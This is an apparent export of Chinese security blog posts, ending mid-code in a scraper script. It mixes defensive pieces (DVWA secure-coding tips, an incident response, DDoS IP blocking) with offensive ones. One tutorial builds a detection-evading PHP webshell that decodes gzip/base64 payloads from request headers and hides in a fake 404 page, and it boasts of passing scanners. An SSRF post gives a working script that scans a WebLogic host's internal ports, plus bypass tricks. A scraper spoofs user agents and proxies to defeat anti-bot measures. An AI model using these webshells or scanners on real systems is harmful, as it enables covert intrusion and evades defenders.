    <content type="text"><![CDATA[本文已发布到“安全脉搏”，原文链接：https://www.secpulse.com/archives/59262.html 0x00 前言 DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。 本文将从DVWA中包含的各种漏洞来学习基本的Web安全开发中的需要注意的问题，本文旨在为Web开发中的新手提供一些安全指南，抛砖引玉，望大牛们多多指点。 0x01 SQL注入1、使用mysql_real_escape_string函数，不要使用addslashesmysql_escape_string已经被弃用，主要说下mysql_real_escape_string和addslashes的区别1.1 这两个函数都会对&#39;、&quot;、\和\x00进行转义处理，除此之外mysql_real_escape_string还会对\r、\n和\x1a进行转义。1.2 在字符集为GBK时，0xbf27不是一个合法的多字节字符，但0xbf5c却是,若我们输入0xbf27addslashes会将它修改为0xbf5c27，0xbf5c会被当作单字节字符，所以成功注入一个单引号，这就是宽字节注入。2、使用is_numeric函数，但是如果单使用is_numeric函数是不行的，因为使用十六进制、科学记数法即可轻松绕过。3、使用PDO技术，PDO是PHP数据对象（PHP Data Object）的缩写，即使用它的准备语句（Prepared Statements，即“参数化查询”）。举个例子：1234567$Statement = $pdo-&gt;prepare("select * from info where id =? and name = ?");$id = 18;$name = 'w2n1ck';$Statement-&gt;bindParam(1,$id);$Statement-&gt;bindParam(2,$name);$Statement-&gt;execute();$Statement-&gt;fetchAll(); PHP会将将SQL模板select * from info where id =? and name = ?和变量bindParam(1,$id);bindParam(2,$name);分两次发送给MySQL，由MySQL完成变量的转义处理，然后进行参数字符串匹配即可。(PS：之前还了解了语义分析防SQL注入，一直觉得PDO很好了，为啥还要语义分析，后来才恍然大悟，PDO是对开发的，语义分析人家是为了卖产品，mdzz)4、DVWA里面还加了Anti-CSRF token验证，进一步提高了系统安全性 0x02 XSS(跨站脚本)DVWA中XSS防护流程步骤代码如下：12345$message = trim( $_POST[ 'mtxMessage' ] );Sanitize message input$message = stripslashes( $message );$message = mysql_real_escape_string( $message );$message = htmlspecialchars( $message ); 1、使用trim函数，trim函数移除字符串两侧的空白字符或其他预定义字符。因为有时候我们会使用\t、\n、\r&quot;等尝试绕过。2、使用stripslashes,删除由 addslashes()函数添加的反斜杠。3、使用mysql_real_escape_string转义一些特殊的字符。4、使用htmlspecialchars把特殊字符&amp;,&quot;,&#39;,&lt;,&gt;替换为HTML实体&amp;amp;&amp;quot;&amp;#039;&amp;lt;&amp;gt;,但我们还是可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS123456&lt;a href="&lt;?php echo htmlspecialchars("javascript:alert(1)",ENT_QUOTES); ?&gt;"&gt;test&lt;/a&gt;&lt;a href="&lt;?php echo htmlspecialchars("javascript:location%3Dhttp%3A%2F%2Fwww.baidu.com",ENT_QUOTES); ?&gt;"&gt;test&lt;/a&gt; 总结：对输入(URL参数)进行过滤；对输出进行编码；白名单和黑名单结合； 0x03 文件上传DVWA中文件安全上传的流程： 1、取文件最后的扩展名1$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 2、对上传文件的文件名做随机数重命名操作DVWA用的是MD5，rand()函数也可以1$target_file = md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 3、采取白名单方式验证文件的后缀名，MIME-TYPE类型，以及文件大小123if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' 4、检查是否为真正图片1getimagesize( $uploaded_tmp ) 5、使用GD库或image-magick进行二次渲染二次渲染，清除图片中的恶意代码1$img = imagecreatefromjpeg( $uploaded_tmp ); 6、回显相对路径1if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) DVWA中只是从代码设计层面考虑文件上传的安全性，比如还有Nginx与Apache的解析漏洞，截断问题，.htaccess,.user.ini后门,windows特性，ADS流，RTLO技术，包含漏洞等等。 0x04 文件包含DVWA中的文件包含直接写死了就那几个文件，简单粗暴。。。 这里举一些需要注意的点： 使用open_basedir配置，限制文件目录 过滤./,注意不是../，因为可以使用..././..././绕过 禁止服务器远程文件包含,allow_url_fopen=Off与allow_url_include=Off 注意php://input,data://等各种伪协议问题 注意截断问题，比如%00截断,超长路径截断，点号截断12345678910111213file:///var/www/html 访问本地文件系统ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt; 访问FTP(s) URLsdata:// 数据流http:// — 访问 HTTP(s) URLsphp://input — 访问各个输入/输出流zlib:// — 压缩流glob:// — 查找匹配的文件路径模式phar:// — PHP Archivessh2:// — Secure Shell 2rar:// — RARogg:// — Audio streamsexpect:// — 处理交互式的流php://filter/ 0x05 命令执行DVWA中是以ping命令为例12$octet = explode( ".", $target ); //以点号进行分割if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) //判断每个部分是否是数字，同时size是否为4 这里举一些需要注意的点： 1.尽量少用执行命令的函数或者直接禁用2.参数值尽量使用引号包裹3.在使用动态函数之前，确保使用的函数是指定的函数之一4.在进入执行命令的函数、方法之前，对参数进行过滤，对敏感字符进行转义，PHP中使用escapeshellcmd函数 escapeshellcmd对字符串中可能会欺骗shell命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到exec()或system()函数，或者执行操作符 之前进行转义。 特殊字符有`#,&amp;,;反引号,|,*,?,~,&lt;,&gt;,^,(,),[,],{,},$,x0A,x00和xFF`。&apos;和&quot;仅在不配对的时候被转义。在Windows平台上以前缀`^`来转义的 0x06 CSRF(跨站请求伪造)DVWA中的CSRF是以改密码为例。 1、验证token这是一个非常有效的手段，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。12// Check Anti-CSRF tokencheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 2、二次确认12345678910// Get input$pass_curr = $_GET[ 'password_current' ];...// Check that the current password is correct$data = $db-&gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );$data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );$data-&gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR );$data-&gt;execute();// Do both new passwords match and does the current password match the user?if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) )&#123;&#125; 二次确认就是在调用某些功能时进行二次验证，如：删除用户时，产生一个提示对话框，提示”确定删除用户吗？”,转账操作时，要求用户输入二次密码。 3、验证码这是一个非常简单并且有效的防御CSRF的方法。 0x07 暴力破解1、增加验证码，token等验校字段DVWA中加入了Anti-CSRFtoken预防无脑爆破。 2、增加sleep操作只要登陆失败，则延迟3秒，大大降低了爆破速度12// Login failedsleep( rand( 2, 4 ) ); 3、增加登陆错误机制单用户，登陆次数错误到一定次数，即锁定该账户。此外还可以对用户IP等进行频次限制。 0x08 验证码验证码主要会出现一些逻辑漏洞，最常见的有两种： 验证过程分两步，先验证验证码是否正确，正确则进行下一步 验证码没有设置有效时间，导致可以重复使用 参考链接：http://www.jb51.net/article/56612.htmhttp://www.freebuf.com/author/lonehandhttp://www.cnblogs.com/Hyber/p/6133196.htmlhttp://www.am0s.com/functions/227.html]]></content>
      <tags>
        <tag>编程</tag>
        <tag>PHP</tag>
        <tag>代码审计</tag>
        <tag>安全开发</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记D盾_Web查杀中的一个Bug]]></title>
    <url>%2F2017%2F07%2F07%2F%E8%AE%B0D%E7%9B%BE-Web%E6%9F%A5%E6%9D%80%E4%B8%AD%E7%9A%84%E4%B8%80%E4%B8%AABug%2F</url>
    <content type="text"><![CDATA[公司最近的接的项目，需要对40000个webshell样本分析，由于时间紧，也没写东西，先拿D盾凑合着用一次吧，记使用过程中遇到的一个bug。大家看这个图片 D盾报的等级才是“1”，我们看下file_put_contents函数。12345678910file_put_contents(file,data,mode,context)file 必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。data 可选。规定要写入文件的数据。可以是字符串、数组或数据流。mode 可选。规定如何打开/写入文件。可能的值： FILE_USE_INCLUDE_PATH FILE_APPEND LOCK_EXcontext 可选。规定文件句柄的环境。 context 是一套可以修改流的行为的选项。若使用 null，则忽略。 很明显，这个文件的名字要看后端怎么处理，如果是接收POST参数中的“K”，那就是自定义文件名了，就是不是，肯定也是会创建一个新的文件而文件内容就是&lt;?php eval($_POST[k]);?&gt;。 这种很明显不是正常操作啊，但是D盾竟然报等级为“1”！我们使用的时候 有时候会经常忽略等级“3”以下的文件，这就很危险啊。 我猜测：可能是由于D盾的策略是只要在他的规则里出现，就显示出来出现的第一条的那个等级。这明显不符合常理啊！ 最起码要做个全文检测，然后把最高等级的给显示出来，这样，用户再人工排查，就不会出现漏报的情况了。（绕的咱就暂且不说）]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>webshell</tag>
        <tag>应急响应</tag>
        <tag>D盾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次奇葩的应急响应]]></title>
    <url>%2F2017%2F06%2F26%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A5%87%E8%91%A9%E7%9A%84%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%2F</url>
    <content type="text"><![CDATA[上上上周末真是个不平凡的周末，周六公司举办“脉搏涌动”沙龙，虽然忙点，但是也是学到很多，况且还是自己第一次参加安全相关的会议。然后周末上午赶忙完成四爷安排的安全脉搏上的任务，写了个文章发到“安全脉搏”上。下午刚要出去吃饭，工作来了。。。先说下自己在沙龙上学到的 URL跳转的时候可以用\@绕过，\是利用浏览器和后端解析差异，@这个之前在ssrf上绕过用 /%0a/这种形式可绕过一些目录限制以便进行其他操作，之前都用到crlf，waf等上 搜索敏感信息听说bing更强大，小伙伴还给我推荐了DuckDuckGo 总结起来就是：太年轻，年轻，轻。。。[捂脸][捂脸][捂脸] 好了，说下这次的应急响应及自己的思考。感谢加菲猫、四爷带我，跪拜啊！ 0x00 事件描述客户反馈从6月23日开始，网站访问延迟很大，重启服务之后会越来越慢，直至502。网站使用LNMP集成环境，服务器及数据库不是弱口令。6月25号客户买了相关安全产品，未发现明显的恶意攻击行为，同时服务器性能良好。 0x01 事件处理过程首先我的第一反应是被D了，使用top发现服务器性能正常。 然后客户也买了产品，产品上也未出现异常。 然后使用了下自己做的信息收集的linux_信息收集.sh，搜集了下相关信息，查看也并没发现什么异常。 使用了Python版的webshell查杀，也TM没发现啥，各种看日志也并没发现什么卵用，这TM我就崩溃了。。。 然后我又考虑是不是Slow HTTP DDos，但是没办法验证啊。 本地复现的话客户肯定不让啊，无助啊。。。 没办法只能继续分析，然后事件出现了转机： 服务会呈现两种情况： http资源未被占尽的情况下，可以访问静态资源以及直接查sql的路由链接，如：12http://xxx/wap/test.css?v=1http://xxx/phpmyadmin/index.php http资源完全被占满，导致静态资源都不能访问，查询进程会发现最大50个httpd进程全启动了。 由于最大只允许50个进程，所以导致这个时候静态和动态的资源都无法进行访问了。检查nginx日志，log中有大量的499状态码，这个是由于客户端等待超时，关闭了链接导致。 暂且在proxy.conf中新增了proxy_ignore_client_abort on; 重启后，不在有客户端主动关闭链接的情况。 检查部分链接源代码函数，如在资源未占满情况下，访问此phpmyadmin/index.php请求是没问题的： http://xxx/xxx/ajax.php 定位到/data/wwwroot/xxx/ajax.action.php文件，查看后发现就是一个简单的sql查询，然后打印了json。 然后访问 “找回密码链接” 每次延迟时间都在28.19秒左右，如下： http://xxx/finduser/findpassword 于是定位到该方法的源代码函数位置，在渲染模版前，尝试die(&#39;111111&#39;);发现很快能显示111111 12345vi ./xxx/finduser.action.php$title = "找回密码";die('1111111');include templates("mobile/user", "findpassword"); 这说明模版在渲染前是没有问题的。 上边两步也就说明了： 不会是攻击的造成的。 sql查询没问题。 之后猜测两种情况： 可能是缓存超时 也可能是连接某个第三方接口超时出现的问题 重新刷新页面，并同时查看端口syn_send情况，果然发现了问题： netstat -anp|grep -i syn_sent|awk &#39;{print $5}&#39;|sort|uniq 12140.207.119.12:44358.246.220.31:443 每访问加载慢的页面，就会多一个这个ip的链接出来。浏览器访问后，发现ssl标识是微信的接口。 api.weixin.qq.com -&gt; 58.246.220.31上边这个在服务器上是ping不通的。查看了下服务器上调用该api的文件。 find ./ -type f -name &quot;*.php&quot;|xargs grep &quot;api.weixin.qq.com&quot; 注释掉/xxx/jssdk.class.php等页面中的api.weixin.qq.com访问不在慢了。 至此，事件问题定位成功。 0x02 安全建议 最简单的，修改/etc/hosts。 和微信方取得联系，解封对api.weixin.qq.com的ip限制。 定位所有调用的api接口，看看还有哪些在服务器上是不能访问的，并进行替换。 0x03 事件思考事后我们和客户交流，客户反馈：由于不可描述的原因，可能用户举报了他们，所以可能是这样导致他们微信API被封。 事后想了想，这TM思路真是猥琐啊！！！ 然后联想到之前猪猪侠小密圈说的 所以，我们就可以利用这点，比如系统需要请求第三方API，那我们就可以构造恶意payload让服务器发送恶意的包或者频繁请求相关API，那么此接口就会被封掉，那么业务就崩了！]]></content>
      <tags>
        <tag>运维</tag>
        <tag>渗透测试</tag>
        <tag>linux</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux下DDos攻击处理方法]]></title>
    <url>%2F2017%2F06%2F18%2Flinux%E4%B8%8BDDos%E6%94%BB%E5%87%BB%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[当我们的 Linux 服务器受到少量攻击时，这时候我们可以使用 iptables 来手动封禁这些攻击者的IP。 如果攻击比较大时，有时我们根本无法响应过来，iptables 基本也就无能为力了。 对于少量攻击处理的步骤应该是：获取IP –&gt; 封IP 1、获取攻击者 IP1.1 通过 netstat 获取如果攻击者攻击的是你的 Web 服务的话，默认是80端口，我们就可以使用下面的代码！ 如果攻击的不是80端口的话，将下面的两个数字80改为你被攻击的端口即可！ 如果你需要显示多条记录，请自己手动将 head -n20 调大即可1netstat -anlp|grep 80|grep tcp|awk '&#123;print $5&#125;'|awk -F: '&#123;print $1&#125;'|sort|uniq -c|sort -nr|head -n20 | netstat -ant |awk '/:80/&#123;split($5,ip,":");++A[ip[1]]&#125;END&#123;for(i in A) print A[i],i&#125;' |sort -rn|head -n20 1.2 通过 tcpdump 获取在使用之前，请确保您的系统已经安装了 tcpdump 。 Debian / Ubuntu 系列快速安装如下 apt-get install -y tcpdump 安装后，使用下面的代码即可。 需要注意的是， -i eth0 指的是你主网卡，如果你是 OpenVZ 的虚拟机的话，就改成您的网卡名venet0 同样你需要设置的是， port 80 设置你被攻击的端口， -c 1000 指 tcpdump 需要统计的记录数，他会在达到这个数之后显示结果。 head -20 设置你要显示的记录条数1tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F"." '&#123;print $1"."$2"."$3"."$4&#125;' | sort | uniq -c | sort -nr |head -20 2、封禁 IP通过上面的步骤，我们已经知道是谁在攻击我们了，现在我们就可以将他们拉入 iptables 禁止他们连接到服务器了。 2.1 封禁单个 IP1iptables -I INPUT -s 211.1.2.1 -j DROP 2.2 封禁一个 IP 段1iptables -I INPUT -s 211.1.2.0/16 -j DROP 如果需要更多关于 iptables 的教程，由于不在本帖需要讲述的内容当中，请自行 Google 答案。 来源：(https://imlonghao.com/8.html)[https://imlonghao.com/8.html]]]></content>
      <tags>
        <tag>运维</tag>
        <tag>tcpdump</tag>
        <tag>iptables</tag>
        <tag>linux</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试小技巧之过waf木马]]></title>
    <url>%2F2017%2F06%2F05%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8B%E8%BF%87waf%E6%9C%A8%E9%A9%AC%2F</url>
    <content type="text"><![CDATA[在研究webshell查杀的时候，学习别人怎么绕waf的思路，今天发现一个很6的函数(至少之前我是没见过)，然后结合之前写访问日志记录文件时用到的方法，very perfect！ Once step普通一句话木马： 1&lt;?php eval($_POST['caidao']);?&gt; Second step首先大家看下这个东西： 不知道大家看到这个字符串会有啥想法，反正说实话，之前我肯定不会太在意。看下源码：1234$compressed = gzcompress(&apos;&lt;?php eval($_POST[\&apos;caidao\&apos;]);?&gt;&apos;, 9);$uncompressed = gzuncompress($compressed);echo $compressed;?&gt; Third step那么重点来了！ 我要说的就是gzcompress这个函数。然后我又查了查相关资料，找到了PHP中具有相同功能的函数还有两个：gzdeflate，gzencode。 科普下:12345678910111213压缩函数：gzcompress gzdeflate gzencode解压函数：gzuncompress gzinflate gzdecodegzdecode是PHP 5.4.0之后才加入的，使用的时候要注意兼容性问题。这几个函数都以gz开头，让人想到gzip压缩，而光看函数名却又看不出它们之间的区别，只能查文档。gzcompress gzdeflate gzencode函数的区别在于它们压缩的数据格式不同：gzcompress使用的是ZLIB格式；gzdeflate使用的是纯粹的DEFLATE格式；gzencode使用的是GZIP格式；其实从PHP 5.4.0开始，这三个函数是一样的，只不过第三个参数的默认值不同；如果调用时传入第三个参数，那么这三个函数返回的数据相同。有兴趣的自己在找找吧 Fourth step写个生成密文的文件。 考虑到可能字符显示不全，无法识别等原因，再套一层base64。 123456if(isset($_POST[&apos;str&apos;]))&#123; $str = $_POST[&apos;str&apos;]; $compressed = base64_encode(gzcompress($str, 9)); echo $compressed;&#125;?&gt; Fifth step结合访问日志记录用到的getallheaders函数，最终的webshell如下： 1&lt;?php eval(gzuncompress(base64_decode(getallheaders()['w2n1ck'])));&gt; 用D盾查一下 虽然级别是小于3，但是说明里面显示可能eval后门，所以要去掉这个，在变形下：1&lt;?php $w2n1ck1=gzuncompress(base64_decode(getallheaders()['cai']));$w2n1ck1(gzuncompress(base64_decode(getallheaders()['dao'])));&gt; 看下webshell可用性 这里注意下，使用eval的话会报错，具体的原因请查看错误详情 在安利下命令执行的一些函数：1'`',eval,assert,exec,passthru,shell_exec,system,putenv,preg_replace,pcntl_exec,popen,proc_open Sixth step再用D盾检测下 还是可疑啊，那行再伪造伪造下123456789101112131415&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;/h1&gt;&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;&lt;?php$cai=getallheaders()['cai'];$dao=getallheaders()['dao'];if($cai!="" and $dao!="")&#123; $cai=gzuncompress(base64_decode($cai));$cai(gzuncompress(base64_decode($dao)));&#125;header('HTTP/1.1 404 Not Found');?&gt;&lt;/body&gt;&lt;/html&gt; 再检测下： 360 5引擎检测下very perfect！ 如果觉得自己添加头麻烦可疑使用自带的请求头字段：123getallheaders()['Accept-Language']getallheaders()['User-Agent']getallheaders()['Accept']]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>WAF绕过</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
        <tag>D盾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF漏洞剖析与利用]]></title>
    <url>%2F2017%2F06%2F04%2FSSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[最近玩的时候想找一下SSRF的相关知识，去自己博客上一看，WTF竟然还没有！好吧。。那就写一个吧，方便自己以后查看，大牛们多多指点。 Know it(让我装个逼，模仿下猪猪侠的词。。。) 什么是SSRFFreebuf:很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击（Server-side Request Forgery） 一句话就是：利用一个可以发起网络请求的服务，当作跳板来攻击其他服务。 SSRF能干什么 探测内网信息 攻击内网或本地其他服务 穿透防火墙 。。。 怎么找SSRF漏洞 能够对外发起网络请求的地方 请求远程服务器资源的地方 数据库内置功能 邮件系统 文件处理 。。。 举几个例子： 在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。 根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。 数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。 邮件系统就是接收邮件服务器地址这些地方。 文件就找ImageMagick，xml这些。 从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。 SSRF怎么形成的SSRF形成的原因就是由于服务端提供了能够发起网络请求或者从其他服务器获取相关资源数据等，但是没有对相关目标地址做任何的限制或过滤，从而导致SSRF漏洞。 Hack it漏洞复现主要模仿curl来请求资源，写入相关文件，之后并显示相关数据。 ssrf.html1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;ssrf test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt; &lt;form name="input" action="ssrf.php" method="POST"&gt; &lt;h2&gt;Search: &lt;input type="text" name="url"&gt;&lt;/h2&gt; &lt;input type="submit" value="Submit"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; ssrf.php1234567891011121314151617&lt;?phpif(isset($_POST['url']))&#123; $link = $_POST['url']; $filename = './'.rand().'.txt'; $curlobj = curl_init($link); $fp = fopen($filename,"w"); curl_setopt($curlobj,CURLOPT_FILE,$fp); curl_setopt($curlobj,CURLOPT_HEADER,0); curl_exec($curlobj); curl_close($curlobj); fclose($fp); $fp = fopen($filename,"r"); $result = fread($fp,filesize($filename)); fclose($fp); echo $result;&#125;?&gt; 这里使用192.168.1.113作为边界服务器，192.168.2.3作为内网服务器。数据内网服务器地址成功显示内网服务器信息 漏洞实践这里以weblogic的SSRF为例(猪猪侠所说的神洞)。如图显示则就是存在SSRF漏洞了。 好了，到现在咱们已经知道存在这个漏洞了，然后应该怎样快速定位该服务器所在的内网地址呢? 这里目前我知道的有三种方法： 使用脚本爆破192.168.*.*，172.16.*.*-172.31.*.*，10.*.*.*这三个内网段 使用burp爆破同上 使用file:/// ，gophar://，ftp://等这些服务器允许的协议去读取proc里可能包含IP地址信息的相关文件 这里我就先简单粗暴的使用burp来一发吧。 。。。运气真特么的好。 内网探测探测内网内的所有主机及开放的端口信息。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# -*- coding: UTF-8 -*-&apos;&apos;&apos;@Author：w2n1ck@Index：http://www.w2n1ck.com/&apos;&apos;&apos;import Queuefrom threading import Threadimport threadingimport urllibimport urllib2import reimport requestsbase_url = &apos;http://xxx.xxx.xxx&apos;thread_list=[]port_list = [21,22,23,25,69,80,81,82,83,84,110,389,398,443,445,488,512,513,514,873,901,1043,1080,1099,1090,1158,1352,1433,1434,1521,2049,2100,2181,2601,2604,3128,3306,3307,3389,4440,4444,4445,4848,5000,5280,5432,5500,5632,5900,5901,5902,5903,5984,6000,6033,6082,6379,6666,7001,7001,7002,7070,7101,7676,7777,7899,7988,8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8069,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8098,8099,8980,8990,8443,8686,8787,8880,8888,9000,9001,9043,9045,9060,9080,9081,9088,9088,9090,9091,9100,9200,9300,9443,9871,9999,10000,10068,10086,11211,20000,22022,22222,27017,28017,50060,50070]que = Queue.Queue()lock = threading.Lock()for port in port_list: que.put(port)def run(): for i in range(1,256): while que.qsize() &gt; 0: port = que.get() #print &quot;ip:172.16.2.&#123;ip&#125;:&#123;port&#125;&quot;.format(ip=i,port=port) url = &quot;http://xxx.xxx.xxx/uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.16.2.%d:%d&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&quot; % (i,port) try: content = requests.get(url,timeout=20,verify=False).content #ssrf检测 result1 = re.findall(&apos;weblogic.uddi.client.structures.exception.XML_SoapException&apos;,content) result2 = re.findall(&apos;but could not connect&apos;,content) result3 = re.findall(&apos;No route to host&apos;,content) if len(result1) != 0 and len(result2) == 0 and len(result3) == 0: print &quot;http://172.16.2.&#123;ip&#125;:&#123;port&#125; is open&quot;.format(ip=i,port=port) except Exception,e: passif __name__ == &apos;__main__&apos;: for i in xrange(20): t=Thread(target=run) thread_list.append(t) for t in thread_list: t.start() for t in thread_list: t.join() SSRF绕过技巧1、@123http://abc@127.0.0.1实际上是以用户名abc连接到站点127.0.0.1，同理http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8 2、添加端口号1http://127.0.0.1:8080 3、短地址1http://ᄒ.ws/ir 4、特殊域名12310.0.0.1.xip.io == 10.0.0.1www.10.0.0.1.xip.io == 10.0.0.1fuzz.ssrf.10.0.0.1.xip.io == 10.0.0.1 5、ip进制转换12345678910111213141516首先以 . 分割数字然后进行10进制转换16进制然后把这串十六进制合在一起再转换成8进制然后指定协议 http://，可用任意个 0 作为前缀：http://000007F000001；（在前面添加过多的 0，在实际SSRF或者XSS中有时会成为绕过过滤的大杀器）1、利用八进制IP地址绕过ping -w 0 -n 1 012.0.0.12、利用十六进制IP地址绕过ping -w 0 -n 1 0xa.0.0.13、 利用十进制的IP地址绕过ping -w 0 -n 1 167772161在PHP里使用ip2long在Python里使用inet_aton4、利用IP地址的省略写法绕过ping -w 0 -n 1 10.1 SSRF防御推荐参考：谈一谈如何在Python开发中拒绝SSRF漏洞]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>WAF绕过</tag>
        <tag>自动化</tag>
        <tag>SSRF</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬虫入库实战之干死反爬虫]]></title>
    <url>%2F2017%2F06%2F02%2F%E7%88%AC%E8%99%AB%E5%85%A5%E5%BA%93%E5%AE%9E%E6%88%98%E4%B9%8B%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[爬虫因为需要大量抓取网页，所以有可能会被ban IP，所以通常使用加UA、代理、XFF等伪造真实IP等策略，其中X-Forwarded-For,Client-ip,REMOTE_ADDR可以使用burp的爆破模块，四个payload随机生成就行了，本文重点使用UA、代理IP测试。 0x00 设置编码首先设置下默认编码。1234567文件编码reload(sys)sys.setdefaultencoding('utf-8')数据库编码CREATE DATABASE 'proxy' DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;数据传输编码charset='utf8mb4' 0x01 设置UA123456789101112config=&#123; 'NUM':10, 'timeout':5, 'USER_AGENTS':[ "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)", "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6", "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1", "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0", "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6", "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",]&#125;headers = &#123;'User-Agent': random.choice(config['USER_AGENTS'])&#125; 可以使用字典方式，这里我为了简便就随机粘了几个。 0x02 设置交互方式数据交互使用python的PyMySQL模块，支持py2,py3。1234567891011conn = pymysql.connect( host='127.0.0.1', port=3306, user='root', passwd='123456', db='proxy', charset='utf8mb4', )cur = conn.cursor()sql = "INSERT INTO proxylist(title,price) VALUES ('test1','100')"cur.execute(sql) 0x03 代理获取代理使用免费的西刺代理(没钱-.-)，使用requests、BeautifulSoup做数据处理。1234567891011r = requests.get(url=url_xichi,headers=headers)soup = bs(r.content,'lxml')datas = soup.find_all(name='tr',attrs=&#123;'class':re.compile('(odd)|()')&#125;)for data in datas: proxys = data.find_all(name='td') ip = str(proxys[1].string) port = str(proxys[2].string) type = str(proxys[5].string).lower() avail_proxy = proxy_check(ip,port,type) if avail_proxy != None: return avail_proxy 0x04 代理验证验证代理的存活性，使用站长工具的ip定位实现1234567try: r = requests.get(url=url_check,proxies=proxylist,timeout=5) find_ip = re.findall(r'\'(.*?)\'',r.text)[0] if ip == find_ip: return proxylistexcept Exception,e: pass 0x05 数据入库这里就以谷安网校的课程来爬，主要爬课程名字及对应的价格。效果如下图：附：源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#!/usr/bin/python# -*- coding: UTF-8 -*-'''@Author：W2n1ck@Index：http://www.w2n1ck.com/'''import randomimport reimport requestsimport pymysqlimport sysimport timereload(sys)sys.setdefaultencoding('utf-8')from bs4 import BeautifulSoup as bsconfig=&#123; 'NUM':10, 'timeout':5, 'USER_AGENTS':[ "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)", "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6", 